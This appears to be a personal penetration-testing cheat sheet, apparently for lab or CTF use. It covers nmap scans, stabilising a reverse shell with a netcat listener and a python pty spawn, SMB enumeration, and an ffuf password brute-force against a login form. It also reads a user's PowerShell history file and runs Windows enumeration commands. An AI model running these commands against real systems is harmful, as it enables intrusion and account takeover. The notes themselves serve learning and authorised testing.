# Info gathering

## OSINT
https://crt.sh

### nmap favourite switches
Syn scan, verbose output:
```
nmap -sS -sV targetaddress
```

Aggressive scan:
```
nmap -sS -A targetaddress
```

Default scripts, version info, write normal output to file
```
nmap -sC -sV -oN /where/to/write/results targetaddress
```

All ports, normal output:
```
nmap -p- -oN /where/to/write/results targetaddress
```

### Stabilise a reverse shell

#### rlwrap
Simply start the listener in rlwrap:
```
rlwrap nc -lvnp <port>
```

#### spawn pty
For interactive shell, spawn bash from python on the target machine and set xtrerm:
```
python -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm
```

Background it with `Ctrl + Z`, then switch off echo of the parent shell and foreground it again:
```
stty raw -echo; fg
```

#### Bonus: set correct shell boundaries

First get tty rows and columns from the local shell:
```
stty -a | grep -e rows -e columns
```

Then set the same values in the remote shell:
```
stty rows <number>
stty cols <number>
```

### misc

List smb shares:
```
smbclient -L -N \\\\smbserver\\
```

Connect to smb share:
```
smbclient -N \\\\smbserver\\share
```

Start simple http server in the current dir:
```
python3 -m http.server <portnumer>
```

Start netcat listener:
```
nc -lvnp <portnumber>
```

Password BF example with fuff:
```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
```

## Windows

Get powershell history:
```
type C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

cmd enumeration:
```
net users

systeminfo | findstr /B /C: "OS Name"/C: "OS Version"

wmic service list
```

## Bookmarks
[Reverse shell cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)\
[Crackstation](https://crackstation.net/)\
[Subdomain BF tool](https://github.com/aboul3la/Sublist3r)\
[SecLists - wordlists for all the things](https://github.com/danielmiessler/SecLists)\
[Payloads all the things - as the name suggests](https://github.com/swisskyrepo/PayloadsAllTheThings)\
[PayloadBox - as the name suggests](https://github.com/payloadbox)\
[SharpCollecion - Windows tools](https://github.com/Flangvik/SharpCollection)\
[Hacktricks book](https://book.hacktricks.wiki/)
